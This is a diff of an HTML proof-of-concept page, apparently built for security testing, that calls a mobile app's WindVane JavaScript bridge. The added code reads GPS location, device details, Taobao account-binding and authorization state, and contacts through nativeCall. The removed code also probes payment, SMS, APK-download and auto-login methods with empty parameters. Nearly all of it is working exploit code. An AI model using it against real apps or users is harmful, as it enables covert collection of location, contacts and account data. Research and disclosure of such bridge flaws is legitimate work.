@@ -4,29 +4,23 @@
 <pre id="o" style="white-space:pre-wrap;word-break:break-all;font-size:14px">running…</pre>
 <script>
 var out={href:location.href,hasBridge:!!window.__windvane__,res:[]};
-function show(){var s=JSON.stringify(out,null,1);document.getElementById('o').textContent=s;}
-function C(obj,meth,param,tag){
+function show(){document.getElementById('o').textContent=JSON.stringify(out,null,1);}
+function NC(obj,meth,param,tag){
   try{
-    var w=window.__windvane__;
-    if(w&&w.call){
-      w.call(obj,meth,param||{},
-        function(r){out.res.push(tag+" ▸ "+obj+"."+meth+" OK:"+JSON.stringify(r).slice(0,700));show();},
-        function(e){out.res.push(tag+" ▸ "+obj+"."+meth+" FAIL:"+JSON.stringify(e).slice(0,400));show();});
-    }else{out.res.push("no __windvane__.call");show();}
-  }catch(e){out.res.push(tag+" ▸ "+obj+"."+meth+" EXC:"+e);show();}
+    var r=window.__windvane__.nativeCall(obj,meth,param||{});
+    out.res.push(tag+" ▸ "+obj+"."+meth+" => "+JSON.stringify(r).slice(0,600));
+  }catch(e){out.res.push(tag+" ▸ "+obj+"."+meth+" !! "+String(e).slice(0,200));}
+  show();
 }
-// ① 读方法取真实数据（证明影响；本机自有数据，无第三方）
-C("WVLocation","getLocation",{address:true,gps:true,network:true},"READ-定位");
-C("GG_WVLocation","getLocation",{address:true},"READ-定位2");
-C("CNHybridBaseInfoPlugin","getBaseInfo",{},"READ-设备基础信息");
-C("CNHybridCNAccount","isBindTaobao",{},"READ-账号绑定态");
-C("CNHybridCNAccount","queryAuthorizedResult",{},"READ-授权态");
-// ② 危险方法只发空参（证明可达，不触发真实支付/短信/装APK/授权）
-C("CNAlipay","tradePay",{},"REACH-支付宝下单(空参)");
-C("CNHybridCallAndSMSUtils","callAndSMS",{},"REACH-短信电话(空参)");
-C("CNHybridDownloadApk","downloadApk",{},"REACH-下载APK(空参)");
-C("CNHybridCNAccount","authorize",{},"REACH-账号授权(空参)");
-C("CNHybridAutoLogin","autoLogin",{},"REACH-自动登录(空参)");
-C("WVContacts","find",{},"REACH-通讯录查询(空参)");
-show();setTimeout(show,5000);
+try{
+  NC("WVLocation","getLocation",{address:true,gps:true},"READ-定位");
+  NC("GG_WVLocation","getLocation",{address:true},"READ-定位2");
+  NC("CNWVLocation","getLocation",{},"READ-定位3");
+  NC("CNHybridBaseInfoPlugin","getBaseInfo",{},"READ-设备信息");
+  NC("BaseInfo","getBaseInfo",{},"READ-设备信息2");
+  NC("CNHybridCNAccount","isBindTaobao",{},"READ-账号绑定");
+  NC("CNHybridCNAccount","queryAuthorizedResult",{},"READ-授权态");
+  NC("WVContacts","find",{},"READ-通讯录");
+}catch(e){out.res.push("FATAL:"+e);}
+show();
 </script></body>
